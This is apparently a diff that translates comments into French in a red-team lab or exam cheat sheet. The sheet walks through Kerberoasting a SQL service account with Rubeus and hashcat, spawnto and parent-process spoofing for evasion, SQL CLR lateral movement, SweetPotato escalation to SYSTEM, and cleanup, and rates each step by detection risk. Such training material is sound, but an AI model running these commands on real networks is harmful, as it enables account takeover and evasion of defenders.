@@ -15,11 +15,11 @@ ldapsearch (&(samAccountType=805306368)(servicePrincipalName=*)(!samAccountName=
 >Cibler uniquement le compte `mssql_svc` pour récupérer son hash Kerberos.  
 
 ```sh
-ppid 8276   //  (explorer.exe) → good parent for the sacrificial process
+ppid 8276   // (explorer.exe) → processus parent du processus sacrifié
 
 spawnto x64 C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
 ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
-// DO NOT override spawnto again before execute-assembly
+// Ne pas redéfinir spawnto avant execute-assembly
 
 execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:mssql_svc /nowrap
 ```  
@@ -31,7 +31,7 @@ execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe kerberoast /user:
 > Utiliser Hashcat pour tester le hash Kerberoasting.
 
 ```bash
-# Kerberoast hash — mode 13100 (NOT 18200 which is AS-REP roast)
+# Hash Kerberoasting : mode 13100 (18200 correspond à AS-REP Roasting)
 hashcat -a 0 -m 13100 /media/skippypeanut/2tb-hiksemi/hashcat-cracking/cred-acc-challenge.hash ../wordlists/rockyou.txt
 ```
 
@@ -68,11 +68,11 @@ Script SQL-BOF chargé : `C:\Tools\SQL-BOF\SQL\SQL.cna`.
 ### Vérifier le contexte du Beacon `mssql_svc`
 
 ```cs
-beacon> getuid                        // OPSEC-🟢SAFE — built-in, no child process
-beacon> process_browser               // OPSEC-🟢SAFE — built-in GUI tab, no child process
+beacon> getuid                        // OPSEC-🟢SAFE — commande intégrée, sans processus enfant
+beacon> process_browser               // OPSEC-🟢SAFE — interface intégrée, sans processus enfant
 
-// Check for SeImpersonatePrivilege — present on SQL service accounts
-beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawns spawnto process)
+// Vérifier la présence de SeImpersonatePrivilege sur le compte de service SQL
+beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run : lance le processus spawnto
 ```
 
 > **Vérifier `SeImpersonatePrivilege` :** la présence de ce privilège dépend de la configuration du compte et peut ouvrir une possibilité de Privilege Escalation vers SYSTEM.
@@ -81,66 +81,66 @@ beacon> powerpick whoami /priv        // OPSEC-🟠CAUTION — fork & run (spawn
 
 ```cs
 beacon> file_browser                                         // OPSEC-🟢SAFE — built-in GUI, no child process
-beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-🟢SAFE — built-in beacon command
-beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE — built-in beacon command
-beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — built-in beacon command
+beacon> ls C:\Users\mssql_svc\Desktop                        // OPSEC-🟢SAFE — commande intégrée au Beacon
+beacon> ls C:\Users\mssql_svc\Documents                      // OPSEC-🟢SAFE — commande intégrée au Beacon
+beacon> ls "C:\Program Files\Microsoft SQL Server"           // OPSEC-🟢SAFE — commande intégrée au Beacon
 ```
 
 ### [EXAM DAY] Énumérer les SQL Server
 
 ```cs
-// Enumerate SQL instances via LDAP SPN query
+// Énumérer les instances SQL avec une recherche LDAP des SPN
 beacon> ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
-//                                                            // OPSEC-🟢SAFE — BOF, runs in beacon thread
+//                                                            // OPSEC-🟢SAFE — BOF exécuté dans le thread du Beacon
 
-beacon> sql-info lon-db-1                                     // OPSEC-🟢SAFE — SQL BOF, no child process
-beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — SQL BOF, no child process
+beacon> sql-info lon-db-1                                     // OPSEC-🟢SAFE — SQL BOF sans processus enfant
+beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — SQL BOF sans processus enfant
 
-// If not sysadmin — check linked servers
-beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF, no child process
+// Si le compte n’est pas sysadmin, vérifier les Linked Servers
+beacon> sql-links lon-db-1                                    // OPSEC-🟢SAFE — SQL BOF sans processus enfant
 ```
 
 ### [EXAM DAY] Lateral Movement avec SQL CLR
 
 ```cs
-beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — confirm sysadmin before proceeding
+beacon> sql-whoami lon-db-1                                   // OPSEC-🟢SAFE — vérifier le rôle sysadmin avant de poursuivre
 
-beacon> sql-enableclr lon-db-1                                // OPSEC-🟠CAUTION — modifies SQL server config (sp_configure change, detectable in SQL audit log)
+beacon> sql-enableclr lon-db-1                                // OPSEC-🟠CAUTION — modifie sp_configure et peut être journalisé dans SQL Server
 beacon> sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
-//                                                            // OPSEC-🟠CAUTION — loads CLR assembly into SQL, visible in sys.assemblies
+//                                                            // OPSEC-🟠CAUTION — charge une assembly CLR visible dans sys.assemblies
 
-beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connects to waiting SMB beacon, no new process
+beacon> link lon-db-1 <SMB-PIPENAME>                          // OPSEC-🟢SAFE — connexion au Beacon SMB existant, sans nouveau processus
 ```
 
 ### [EXAM DAY] Privilege Escalation avec `SeImpersonatePrivilege`
 
 ```cs
-// SweetPotato — payload must be pre-staged on the SQL host as tcp-local EXE
+// SweetPotato : le payload tcp-local EXE doit déjà être présent sur l’hôte SQL
 beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
 //                                                            // OPSEC-🟠CAUTION — fork & run (execute-assembly spawns spawnto process)
-beacon> connect localhost 1337                                // OPSEC-🟢SAFE — links to SYSTEM beacon over TCP, no new process
+beacon> connect localhost 1337                                // OPSEC-🟢SAFE — connexion TCP au Beacon SYSTEM sans nouveau processus
 ```
 
 ### [EXAM DAY] Nettoyer SQL CLR
 
 ```cs
-beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — reverts sp_configure change, logged in SQL audit
+beacon> sql-disableclr lon-db-1                               // OPSEC-🟠CAUTION — restaure sp_configure ; l’action peut être journalisée
 ```
 
 ### Aide-mémoire après l’obtention du Beacon `mssql_svc`
 
 ```
-mssql_svc beacon obtained
+Beacon mssql_svc obtenu
 │
-├─ Check whoami /priv
+├─ Vérifier whoami /priv
 │   └─ SeImpersonatePrivilege = Yes
 │       → SweetPotato → SYSTEM on current host (Step 5)
 │
-├─ SQL server in scope?
+├─ SQL Server dans le périmètre ?
 │   └─ Yes → sql-whoami → sysadmin?
 │       ├─ Yes → sql-enableclr → sql-clr → beacon on SQL host (Step 4)
-│       └─ No  → check sql-links → lateral via linked server
+│       └─ No  → vérifier sql-links → Lateral Movement via Linked Server
 │
-└─ File system enumeration → look for flags, creds, config files (Step 2)
+└─ Énumération des fichiers → rechercher les éléments du lab et fichiers de configuration (étape 2)
 ```
 
